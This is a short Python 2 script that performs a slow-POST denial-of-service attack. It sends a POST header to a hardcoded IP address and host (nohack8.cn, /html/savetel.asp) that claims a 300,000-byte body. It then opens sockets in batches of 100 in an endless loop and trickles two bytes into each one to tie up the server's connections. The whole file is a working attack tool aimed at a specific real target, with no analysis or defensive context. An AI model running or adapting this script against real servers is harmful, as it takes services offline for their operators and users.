#!/usr/bin/env python
#coding=utf-8
import socket,time
socket.setdefaulttimeout(3)
cs,header=[],"""POST /html/savetel.asp HTTP/1.1
Host: nohack8.cn
Connection: keep-alive
Content-Length: 300000
Cache-Control: max-age=0
Origin: http://nohack8.cn
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.19 (KHTML, like Gecko) Ubuntu/12.04 Chromium/18.0.1025.168 Chrome/18.0.1025.168 Safari/535.19
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://nohack8.cn/
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-US,en;q=0.8
Accept-Charset: UTF-8,*;q=0.5
Cookie: ASPSESSIONIDQCSTQQSC=ECBMKHLCKBFFIAEKJBLJMMLD\r\n\r\n"""
while True:
    try:
        for i in range(100):
            csd=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            csd.connect(('98.126.125.187',80))
            csd.send(header)
            cs.append(csd)
    except KeyboardInterrupt,error:
        for i in range(len(cs)):
            try:
                cs[0].close()
            except Exception,error:
                print type(error),error
            cs.remove(cs[0])
            print 'closing...',len(cs)
        break
    except Exception,error:
        print type(error),error
    print 'connect',len(cs)
    for csd in cs:
        try:
            csd.send('io')
        except KeyboardInterrupt,error:
            for i in range(len(cs)):
                try:
                    cs[0].close()
                except Exception,error:
                    print type(error),error
                cs.remove(cs[0])
                print 'closing...',len(cs)
            break
        except:
            cs.remove(csd)
